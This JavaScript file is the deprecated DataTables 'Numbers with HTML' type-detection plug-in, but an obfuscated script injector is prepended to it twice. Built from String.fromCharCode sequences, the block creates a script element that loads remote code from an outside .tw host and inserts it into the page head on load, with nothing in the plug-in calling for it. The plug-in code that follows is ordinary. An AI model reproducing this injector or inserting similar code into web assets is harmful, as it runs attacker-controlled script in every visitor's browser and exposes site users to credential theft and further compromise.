Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * This type-detection plug-in will look at an HTML string from a data cell,
 * strip the HTML tags and then check to see if the remaining data is numeric.
 * If it is, then the data can be sorted numerically with the Numbers with HTML
 * sorting plug-in.
 *
 * DataTables 1.10+ has numeric HTML data type and sorting abilities built-in.
 * As such this plug-in is marked as deprecated, but might be useful when
 * working with old versions of DataTables.
 *
 *  @name Numbers with HTML
 *  @summary Detect data which is a mix of HTML and numeric data.
 *  @deprecated
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 */

jQuery.fn.dataTableExt.aTypes.unshift( function ( sData )
{
	sData = typeof sData.replace == 'function' ?
		sData.replace( /<[\s\S]*?>/g, "" ) : sData;
	sData = $.trim(sData);

	var sValidFirstChars = "0123456789-";
	var sValidChars = "0123456789.";
	var Char;
	var bDecimal = false;

	/* Check for a valid first char (no period and allow negatives) */
	Char = sData.charAt(0);
	if (sValidFirstChars.indexOf(Char) == -1)
	{
		return null;
	}

	/* Check all the other characters are valid */
	for ( var i=1 ; i<sData.length ; i++ )
	{
		Char = sData.charAt(i);
		if (sValidChars.indexOf(Char) == -1)
		{
			return null;
		}

		/* Only allowed one decimal place... */
		if ( Char == "." )
		{
			if ( bDecimal )
			{
				return null;
			}
			bDecimal = true;
		}
	}

	return 'num-html';
} );
